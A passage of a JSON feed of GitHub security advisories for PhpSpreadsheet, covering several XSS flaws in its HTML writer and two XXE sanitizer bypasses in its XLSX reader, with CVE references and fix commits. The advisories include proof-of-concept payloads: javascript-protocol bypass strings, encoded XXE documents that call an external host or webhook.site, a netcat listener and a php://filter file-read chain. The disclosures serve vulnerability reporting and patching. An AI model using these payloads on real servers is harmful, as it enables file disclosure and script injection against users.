href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56409\">https://nvd.nist.gov/vuln/detail/CVE-2024-56409</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j2xg-cjcx-4677\">https://github.com/advisories/GHSA-j2xg-cjcx-4677</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet allows unauthorized Reflected XSS in Currency.php file",
            "date_modified": "2025-03-06T18:18:56.000Z",
            "date_published": "2025-01-03T17:06:51.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j2xg-cjcx-4677"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-in-custom-properties\">Cross-Site Scripting (XSS) vulnerability in custom properties</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is generated without clearing custom properties\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateMeta</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in custom properties in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 9. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a custom property in the file is inserted into the <code>docProps/custom.xml</code> file.</p>\n<p><img alt=\"fig17\" src=\"https://github.com/user-attachments/assets/65453b48-bca5-4f5c-a683-315a7bb1ab1f\"></p>\n<p><em>Figure 17. Embedding the payload</em></p>\n<p>After making the changes, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into an HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig18\" src=\"https://github.com/user-attachments/assets/e0f63bfb-d9e1-4c9d-a2a9-8a0a20406cdc\"></p>\n<p><em>Figure 18. Getting a custom property</em></p>\n<p>When calling the static <code>generateMeta</code> method, you can see that the key of the custom property is displayed without sanitization.</p>\n<p><img alt=\"fig19\" src=\"https://github.com/user-attachments/assets/8c74e264-af68-4f62-8ac7-437e65884e86\"></p>\n<p><em>Figure 19. Getting a custom property</em></p>\n<p>As a result, when viewing the excel file as the HTML representation, arbitrary JavaScript code will be executed.</p>\n<img src=\"https://github.com/user-attachments/assets/a6ed21e3-685c-415c-b2dc-453bc0652bef\" alt=\"fig20\" width=\"356\">\n\n<p><em>Figure 20. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-wv23-996v-q229</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56410\">https://nvd.nist.gov/vuln/detail/CVE-2024-56410</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wv23-996v-q229\">https://github.com/advisories/GHSA-wv23-996v-q229</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wv23-996v-q229",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability in custom properties",
            "date_modified": "2025-03-06T18:18:13.000Z",
            "date_published": "2025-01-03T17:25:45.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wv23-996v-q229"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"cross-site-scripting-xss-vulnerability-of-the-hyperlink-base-in-the-html-page-header\">Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: the HTML page is formed without sanitizing the hyperlink base\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateHTMLHeader</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header in Phpspreadsheet.\nThe following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 8. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can embed a payload in a file property that will result in the execution of arbitrary JavaScript code.\nThe Excel file is unpacked and a HyperlinkBase in the file is inserted into the <code>docProps/app.xml</code> file.</p>\n<p><img alt=\"fig14\" src=\"https://github.com/user-attachments/assets/f68ef7fc-e78e-4424-8753-4318b6ff51c3\"></p>\n<p><em>Figure 14. Embedding the payload</em> </p>\n<p>After the changes were made, a new archive with the xlsx extension was created. At the moment of converting the xlsx file into the HTML representation, a property is obtained that participates in the formation of a string without sanitization.</p>\n<p><img alt=\"fig15\" src=\"https://github.com/user-attachments/assets/0aa7398c-ddd9-4c5a-ab04-41af0236dcba\"></p>\n<p><em>Figure 15. Generating the HTML page header using the HyperlinkBase property</em> </p>\n<p>After generating and displaying the HTML representation of the XLSX file, arbitrary JavaScript code will be executed.\n<img src=\"https://github.com/user-attachments/assets/c3694661-31e3-4be8-9a86-6eb4dd4647b5\" alt=\"fig16\" width=\"356\"></p>\n<p><em>Figure 16. Executing arbitrary JavaScript code</em> </p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-hwcp-2h35-p66w</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56411\">https://nvd.nist.gov/vuln/detail/CVE-2024-56411</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hwcp-2h35-p66w\">https://github.com/advisories/GHSA-hwcp-2h35-p66w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet has a Cross-Site Scripting (XSS) vulnerability of the hyperlink base in the HTML page header",
            "date_modified": "2025-03-06T18:17:35.000Z",
            "date_published": "2025-01-03T17:28:50.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hwcp-2h35-p66w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h1 id=\"bypass-xss-sanitizer-using-the-javascript-protocol-and-special-characters\">Bypass XSS sanitizer using the javascript protocol and special characters</h1>\n<p><strong>Product</strong>: Phpspreadsheet\n<strong>Version</strong>: version 3.6.0\n<strong>CWE-ID</strong>: CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')\n<strong>CVSS vector v.3.1</strong>: 5.4 (AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N)\n<strong>CVSS vector v.4.0</strong>: 4.8 (AV:N/AC:L/AT:N/PR:L/UI:A/VC:L/VI:L/VA:N/SC:L/SI:L/SA:N)\n<strong>Description</strong>: an attacker can use special characters, so that the library processes the javascript protocol with special characters and generates an HTML link\n<strong>Impact</strong>: executing arbitrary JavaScript code in the browser\n<strong>Vulnerable component</strong>: class <code>PhpOffice\\PhpSpreadsheet\\Writer\\Html</code>, method <code>generateRow</code>\n<strong>Exploitation conditions</strong>: a user viewing a specially generated Excel file\n<strong>Mitigation</strong>: additional sanitization of special characters in a string\n<strong>Researcher</strong>: Aleksey Solovev (Positive Technologies)</p>\n<h1 id=\"research\">Research</h1>\n<p>The researcher discovered zero-day vulnerability Bypass XSS sanitizer using the javascript protocol and special characters in Phpspreadsheet.</p>\n<p>The following code is written on the server, which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<p><em>Listing 6. Source code on the server</em></p>\n<pre><code>&lt;?php\n\nrequire __DIR__ . '/vendor/autoload.php';\n\n$inputFileName = './doc/Book1.xlsx';\n$spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n$writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\nprint($writer-&gt;generateHTMLAll());\n</code></pre>\n<p>An attacker can use special characters so that this library processes the javascript protocol with special characters and generates a HTML link.\nThe Excel file is unpacked and a hyperlink in the file is inserted into the <code>xl/worksheets/sheet1.xml</code> file.</p>\n<p><img alt=\"fig11\" src=\"https://github.com/user-attachments/assets/b9d53f7a-6f36-4853-95f9-8aa22f81eccd\"></p>\n<p><em>Figure 11. Using the javascript protocol with special characters</em></p>\n<p>Some payloads help bypass the security system and carry out a XSS attack.</p>\n<p><em>Listing 7. HTML form that demonstrates the exploitation of the XSS vulnerability</em></p>\n<pre><code>jav&amp;#x09;ascript:alert()\njav&amp;#x0D;ascript:alert()\njav&amp;#x0A;ascript:alert()\n</code></pre>\n<p>It's clear that the javascript protocol with special characters is used. </p>\n<p><img alt=\"fig12\" src=\"https://github.com/user-attachments/assets/7595e88b-9848-4251-845c-2c2d8032e479\"></p>\n<p><em>Figure 12. Using the javascript protocol with special characters</em></p>\n<p>Due to the special characters, the execution stream ends up on line 1543, and the link is built in HTML form with the javascript protocol.</p>\n<img src=\"https://github.com/user-attachments/assets/3ca0c3c6-daa9-4502-ad9e-b803f308fd26\" alt=\"fig13\" width=\"373\">\n\n<p><em>Figure 13. Executing arbitrary JavaScript code</em></p>\n<h1 id=\"credit\">Credit</h1>\n<p>This vulnerability was discovered by <strong>Aleksey Solovev (Positive Technologies)</strong></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e\">https://github.com/PHPOffice/PhpSpreadsheet/commit/45052f88e04c735d56457a8ffcdc40b2635a028e</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-56412\">https://nvd.nist.gov/vuln/detail/CVE-2024-56412</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-q9jv-mm3r-j47r\">https://github.com/advisories/GHSA-q9jv-mm3r-j47r</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r",
            "title": "[phpoffice/phpexcel] PhpSpreadsheet allows bypass XSS sanitizer using the javascript protocol and special characters",
            "date_modified": "2025-03-06T18:16:57.000Z",
            "date_published": "2025-01-03T17:29:10.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-q9jv-mm3r-j47r"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The researcher discovered zero-day vulnerability Cross-Site Scripting (XSS) vulnerability in the code which translates the XLSX file into a HTML representation and displays it in the response.</p>\n<h3 id=\"details\">Details</h3>\n<p>When generating the HTML from an xlsx file containing multiple sheets, a navigation menu is created. This menu includes the sheet names, which are not sanitized. As a result, an attacker can exploit this vulnerability to execute JavaScript code.</p>\n<pre><code class=\"language-php\">        // Construct HTML\n        $html = '';\n\n        // Only if there are more than 1 sheets\n        if (count($sheets) &gt; 1) {\n            // Loop all sheets\n            $sheetId = 0;\n\n            $html .= '&lt;ul class=\"navigation\"&gt;' . PHP_EOL;\n\n            foreach ($sheets as $sheet) {\n                $html .= '  &lt;li class=\"sheet' . $sheetId . '\"&gt;&lt;a href=\"#sheet' . $sheetId . '\"&gt;' . $sheet-&gt;getTitle() . '&lt;/a&gt;&lt;/li&gt;' . PHP_EOL;\n                ++$sheetId;\n            }\n\n            $html .= '&lt;/ul&gt;' . PHP_EOL;\n        }\n</code></pre>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li><p>Create an XLSX file with multiple sheets : \n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/e3fc027a-9525-4d7f-b107-cfa6e78d04e7\"></p>\n</li>\n<li><p>Generate the HTML content</p>\n</li>\n</ol>\n<pre><code class=\"language-php\">&lt;?php\n    require __DIR__ . '/vendor/autoload.php';\n\n    $inputFileName = 'payload.xlsx';\n    $spreadsheet = \\PhpOffice\\PhpSpreadsheet\\IOFactory::load($inputFileName);\n    $writer = new \\PhpOffice\\PhpSpreadsheet\\Writer\\Html($spreadsheet);\n    $writer-&gt;writeAllSheets();\n    echo $writer-&gt;generateHTMLAll();\n?&gt;\n</code></pre>\n<ol start=\"3\">\n<li>Enjoy\n<img alt=\"image\" src=\"https://github.com/user-attachments/assets/3e3c24f4-cb5d-451d-978f-9d33234f3bd1\"></li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>XSS can cause a variety of problems for the end user that range in severity from an annoyance to complete account compromise.\nExample of impacts :</p>\n<ul>\n<li>Disclosure of the user’s session cookie, allowing an attacker to hijack the user’s session and take over the account (Only if HttpOnly cookie's flag is set to false).</li>\n<li>Redirecting the user to some other page or site (like phishing websites)</li>\n<li>Modifying the content of the current page (add a fake login page that sends credentials to the attacker).</li>\n<li>Automatically download malicious files.</li>\n<li>Requests access to the victim geolocation / camera.</li>\n<li>...</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-79xx-vf93-p7cx</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-22131\">https://nvd.nist.gov/vuln/detail/CVE-2025-22131</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/4088381ccfaf241d7d42c333de0dc8c98e338743\">https://github.com/PHPOffice/PhpSpreadsheet/commit/4088381ccfaf241d7d42c333de0dc8c98e338743</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-79xx-vf93-p7cx\">https://github.com/advisories/GHSA-79xx-vf93-p7cx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-79xx-vf93-p7cx",
            "title": "[phpoffice/phpexcel] Cross-Site Scripting (XSS) vulnerability in generateNavigation() function in PhpSpreadsheet",
            "date_modified": "2025-03-06T18:16:09.000Z",
            "date_published": "2025-01-21T21:09:13.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-79xx-vf93-p7cx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">XmlScanner class</a> has a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L72\">scan</a> method which should prevent XXE attacks.</p>\n<p>However, the regexes used in the <code>scan</code> method and the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method can be bypassed by using UCS-4 and encoding guessing as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<h3 id=\"details\">Details</h3>\n<p>The <code>scan</code> method converts the input in the UTF-8 encoding if it is not already in the UTF-8 encoding with the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L76\"><code>toUtf8</code> method</a>.\nThen, the <code>scan</code> method uses a <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L79\">regex</a> which would also work with 16-bit encoding.</p>\n<p>However, the regexes from the <a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php#L51\">findCharSet</a> method, which is used for determining the current encoding can be bypassed by using an encoding which has more than 8 bits, since the regex does not expect null bytes, and the XML library will also autodetect the encoding as described in <a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a>.</p>\n<p>A payload for the <code>workbook.xml</code> file can for example be created with <a href=\"https://gchq.github.io/CyberChef/#recipe=Encode_text('UTF-32BE%20(12001)')&amp;input=PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTE2IiBzdGFuZGFsb25lPSJ5ZXMiPz4KPCFET0NUWVBFIG1lc3NhZ2UgWwogICAgPCFFTlRJVFkgJSBleHQgU1lTVEVNICJodHRwOi8vMTI3LjAuMC4xOjEyMzQ1L2V4dC5kdGQiPgogICAgJWV4dDsKXT4KPHdvcmtib29rIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5vcGVueG1sZm9ybWF0cy5vcmcvc3ByZWFkc2hlZXRtbC8yMDA2L21haW4iIHhtbG5zOnI9Imh0dHA6Ly9zY2hlbWFzLm9wZW54bWxmb3JtYXRzLm9yZy9vZmZpY2VEb2N1bWVudC8yMDA2L3JlbGF0aW9uc2hpcHMiPjxmaWxlVmVyc2lvbiBhcHBOYW1lPSJDYWxjIi8%2BPHdvcmtib29rUHIgYmFja3VwRmlsZT0iZmFsc2UiIHNob3dPYmplY3RzPSJhbGwiIGRhdGUxOTA0PSJmYWxzZSIvPjx3b3JrYm9va1Byb3RlY3Rpb24vPjxib29rVmlld3M%2BPHdvcmtib29rVmlldyBzaG93SG9yaXpvbnRhbFNjcm9sbD0idHJ1ZSIgc2hvd1ZlcnRpY2FsU2Nyb2xsPSJ0cnVlIiBzaG93U2hlZXRUYWJzPSJ0cnVlIiB4V2luZG93PSIwIiB5V2luZG93PSIwIiB3aW5kb3dXaWR0aD0iMTYzODQiIHdpbmRvd0hlaWdodD0iODE5MiIgdGFiUmF0aW89IjUwMCIgZmlyc3RTaGVldD0iMCIgYWN0aXZlVGFiPSIwIi8%2BPC9ib29rVmlld3M%2BPHNoZWV0cz48c2hlZXQgbmFtZT0iU2hlZXQxIiBzaGVldElkPSIxIiBzdGF0ZT0idmlzaWJsZSIgcjppZD0icklkMiIvPjwvc2hlZXRzPjxjYWxjUHIgaXRlcmF0ZUNvdW50PSIxMDAiIHJlZk1vZGU9IkExIiBpdGVyYXRlPSJmYWxzZSIgaXRlcmF0ZURlbHRhPSIwLjAwMSIvPjxleHRMc3Q%2BPGV4dCB4bWxuczpsb2V4dD0iaHR0cDovL3NjaGVtYXMubGlicmVvZmZpY2Uub3JnLyIgdXJpPSJ7NzYyNkM4NjItMkExMy0xMUU1LUIzNDUtRkVGRjgxOUNEQzlGfSI%2BPGxvZXh0OmV4dENhbGNQciBzdHJpbmdSZWZTeW50YXg9IkNhbGNBMSIvPjwvZXh0PjwvZXh0THN0Pjwvd29ya2Jvb2s%2B.\">CyberChef</a>.\nIf you open an Excel file containing the payload from the link above stored in the <code>workbook.xml</code> file with PhpSpreadsheet, you will receive an HTTP request on <code>127.0.0.1:12345</code>. You can test that an HTTP request is created by running the <code>nc -nlvp 12345</code> command before opening the file containing the payload with PhpSpreadsheet.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create a new folder.</li>\n<li>Run the <code>composer require phpoffice/phpspreadsheet</code> command in the new folder.</li>\n<li>Create an <code>index.php</code> file in that folder with the following content:</li>\n</ul>\n<pre><code class=\"language-PHP\">&lt;?php\nrequire 'vendor/autoload.php';\n\nuse PhpOffice\\PhpSpreadsheet\\Spreadsheet;\nuse PhpOffice\\PhpSpreadsheet\\Writer\\Xlsx;\n\n$spreadsheet = new Spreadsheet();\n\n$inputFileType = 'Xlsx';\n$inputFileName = './payload.xlsx';\n\n/**  Create a new Reader of the type defined in $inputFileType  **/\n$reader = \\PhpOffice\\PhpSpreadsheet\\IOFactory::createReader($inputFileType);\n/**  Advise the Reader that we only want to load cell data  **/\n$reader-&gt;setReadDataOnly(true);\n\n$worksheetData = $reader-&gt;listWorksheetInfo($inputFileName);\n\nforeach ($worksheetData as $worksheet) {\n\n$sheetName = $worksheet['worksheetName'];\n\necho \"&lt;h4&gt;$sheetName&lt;/h4&gt;\";\n/**  Load $inputFileName to a Spreadsheet Object  **/\n$reader-&gt;setLoadSheetsOnly($sheetName);\n$spreadsheet = $reader-&gt;load($inputFileName);\n\n$worksheet = $spreadsheet-&gt;getActiveSheet();\nprint_r($worksheet-&gt;toArray());\n\n}\n</code></pre>\n<ul>\n<li>Run the following command: <code>php -S 127.0.0.1:8080</code></li>\n<li>Add the <a href=\"https://github.com/user-attachments/files/17334157/payload.xlsx\">payload.xlsx</a> file, which contains a payload similar to the payload from the details section, but with the URL <code>https://webhook.site/65744200-63d2-43a2-a6a0-cca8d6b0d50a</code> instead of the <code>http://127.0.0.1:12345/ext.dtd</code> URL, in the folder and open <a href=\"https://127.0.0.1:8080\">https://127.0.0.1:8080</a> in a browser. You will see an HTTP request on <a href=\"https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a\">https://webhook.site/#!/view/65744200-63d2-43a2-a6a0-cca8d6b0d50a</a>.</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can bypass the sanitizer and achieve an <a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">XXE attack</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-47873\">https://nvd.nist.gov/vuln/detail/CVE-2024-47873</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php\">https://github.com/PHPOffice/PhpSpreadsheet/blob/39fc51309181e82593b06e2fa8e45ef8333a0335/src/PhpSpreadsheet/Reader/Security/XmlScanner.php</a></li>\n<li><a href=\"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing\">https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing</a></li>\n<li><a href=\"https://www.w3.org/TR/xml/#sec-guessing-no-ext-info\">https://www.w3.org/TR/xml/#sec-guessing-no-ext-info</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jw4x-v69f-hh5w\">https://github.com/advisories/GHSA-jw4x-v69f-hh5w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w",
            "title": "[phpoffice/phpexcel] XmlScanner bypass leads to XXE",
            "date_modified": "2025-03-06T18:15:32.000Z",
            "date_published": "2024-11-18T20:01:20.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jw4x-v69f-hh5w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The security scanner responsible for preventing XXE attacks in the XLSX reader can be bypassed by slightly modifying the XML structure, utilizing white-spaces. On servers that allow users to upload their own Excel (XLSX) sheets, Server files and sensitive information can be disclosed by providing a crafted sheet. </p>\n<h3 id=\"details\">Details</h3>\n<p>The security scan function in <code>src/PhpSpreadsheet/Reader/Security/XmlScanner.php</code> contains a flawed XML encoding check to retrieve the input file's XML encoding in the <code>toUtf8</code> function. </p>\n<p>The function searches for the XML encoding through a defined regex which looks for <code>encoding=\"*\"</code> and/or <code>encoding='*'</code>, if not found, it defaults to the UTF-8 encoding which bypasses the conversion logic. </p>\n<pre><code>$patterns = [\n           '/encoding=\"([^\"]*]?)\"/',\n           \"/encoding='([^']*?)'/\",\n];\n</code></pre>\n<p>This logic can be used to pass a UTF-7 encoded XXE payload, by utilizing a whitespace before or after the <code>=</code> in the attribute definition. </p>\n<h3 id=\"poc\">PoC</h3>\n<p>Needed:</p>\n<ul>\n<li>An Excel sheet (XLSX) with at least one cell containing a value.</li>\n</ul>\n<p>Unzip the excel sheet, and modify the <code>xl/SharedStrings.xml</code> file with the following value (note the space after <code>encoding=</code>):</p>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE abc [ ... ]&gt;\n</code></pre>\n<h4 id=\"step-by-step\">Step-by-step</h4>\n<ol>\n<li>First off, the following string is encoded in base64:</li>\n</ol>\n<pre><code>&lt;!ENTITY internal 'abc'  &gt;\" \n</code></pre>\n<p>Resulting in:</p>\n<pre><code>PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\n</code></pre>\n<ol start=\"2\">\n<li>The string is used with a parameter entity and the PHP filter wrapper to ultimately define custom entities and call them within the XML.</li>\n</ol>\n<pre><code>&lt;?xml version=\"1.0\" encoding= 'UTF-7' standalone=\"yes\"?&gt;\n+ADw-!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM \"php://filter//resource=data://text/plain;base64,PCFFTlRJVFkgaW50ZXJuYWwgJ2FiYycgID4K\" &gt; %xxe;]&gt;\n&lt;sst xmlns=\"http://schemas.openxmlformats.org/spreadsheetml/2006/main\" count=\"1\" uniqueCount=\"1\"&gt;&lt;si&gt;&lt;t&gt;&amp;internal;&lt;/t&gt;&lt;/si&gt;&lt;/sst&gt;\n</code></pre>\n<p>When this file is parsed by the library, the value <code>abc</code> should be in the original filled cell.</p>\n<p>With the help of the PHP filter wrapper, this can be escalated to information disclosure/file read. </p>\n<h3 id=\"impact\">Impact</h3>\n<p>Sensitive information disclosure through the XXE on sites that allow users to upload their own excel spreadsheets, and parse them using PHPSpreadsheet's Excel parser.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88\">https://github.com/PHPOffice/PhpSpreadsheet/security/advisories/GHSA-6hwr-6v2f-3m88</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c\">https://github.com/PHPOffice/PhpSpreadsheet/commit/3bcd51826b7f089d1641e756c83030c30c3bdb0c</a></li>\n<li><a href=\"https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331\">https://github.com/PHPOffice/PhpSpreadsheet/commit/7d6cb09f6e8204f65e6dd5a0490f7f45f44bb331</a></li>\n<li><a 